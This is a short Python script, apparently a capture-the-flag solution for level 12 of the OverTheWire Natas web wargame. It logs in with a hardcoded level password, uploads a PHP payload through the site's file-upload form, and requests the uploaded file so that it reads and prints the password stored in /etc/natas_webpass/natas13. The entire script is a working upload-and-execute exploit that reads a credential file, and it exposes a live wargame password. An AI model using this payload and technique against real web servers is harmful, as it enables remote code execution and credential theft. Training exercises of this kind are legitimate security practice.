#!/usr/bin/env python2
# -*- coding: utf-8 -*-
"""
  level12.py
  Solution for natas level12
"""
__author__ = 'kall.micke@gmail.com'

import requests
import sys
import os
import re

level = 12
user = 'natas%s' % level
host = 'http://natas%s.natas.labs.overthewire.org' % level
password = 'EDXp0pS26wLKHZy1rDBPUZk0RKfLGIR3'

def upload_payload():

   _payload = r'''<?php
    echo file_get_contents("/etc/natas_webpass/natas13");
   ?>'''

   files = {'uploadedfile': ('payload.php', _payload)}
   data = dict(filename='payload.php')

   r = requests.post(host, auth=(user, password), files=files, data=data)
   filename = re.findall('''(upload/\S{10}.php)''', r.content)[0]
   return filename

def get_flag():

    filename = upload_payload()
    r = requests.get("%s/%s" % (host, filename), auth=(user, password))
    return r.content.strip()

if __name__ == '__main__':
    print("Flag: %s" % get_flag())
